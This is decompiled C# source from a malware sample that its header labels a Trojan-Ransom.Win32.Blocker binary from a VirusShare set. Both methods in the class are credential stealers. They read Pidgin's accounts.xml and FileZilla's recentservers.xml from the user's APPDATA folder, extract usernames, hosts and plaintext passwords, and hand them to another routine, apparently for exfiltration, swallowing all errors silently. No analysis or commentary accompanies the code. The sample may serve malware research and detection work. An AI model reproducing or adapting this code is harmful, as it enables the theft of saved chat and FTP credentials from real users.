// Decompiled with JetBrains decompiler
// Type: insomnia.Class27
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System;
using System.IO;
using System.Threading;
using System.Xml;

namespace insomnia
{
  internal class Class27
  {
    public static void Method2()
    {
      try
      {
        XmlDocument xmlDocument = new XmlDocument();
        string str = Environment.GetEnvironmentVariable("APPDATA") + "\\.purple\\accounts.xml";
        if (!File.Exists(str))
          return;
        xmlDocument.Load(str);
        XmlNodeList elementsByTagName1 = xmlDocument.GetElementsByTagName("protocol");
        XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("name");
        XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("password");
        for (int i = 0; i < elementsByTagName1.Count; ++i)
        {
          Class31.Method3("[IM]: " + elementsByTagName1[i].InnerText.ToUpper().Replace("PRPL-", "") + " -> " + elementsByTagName2[i].InnerText + " : " + elementsByTagName3[i].InnerText, Class26.Field8);
          Thread.Sleep(500);
        }
      }
      catch
      {
      }
    }

    public static void Method1()
    {
      try
      {
        XmlDocument xmlDocument = new XmlDocument();
        string str = Environment.GetEnvironmentVariable("APPDATA") + "\\FileZilla\\recentservers.xml";
        if (!File.Exists(str))
          return;
        xmlDocument.Load(str);
        XmlNodeList elementsByTagName1 = xmlDocument.GetElementsByTagName("Host");
        XmlNodeList elementsByTagName2 = xmlDocument.GetElementsByTagName("User");
        XmlNodeList elementsByTagName3 = xmlDocument.GetElementsByTagName("Pass");
        for (int i = 0; i < elementsByTagName1.Count; ++i)
        {
          Class31.Method3("[FTP]: " + elementsByTagName1[i].InnerText + " -> " + elementsByTagName2[i].InnerText + " : " + elementsByTagName3[i].InnerText, Class26.Field8);
          Thread.Sleep(500);
        }
      }
      catch
      {
      }
    }
  }
}
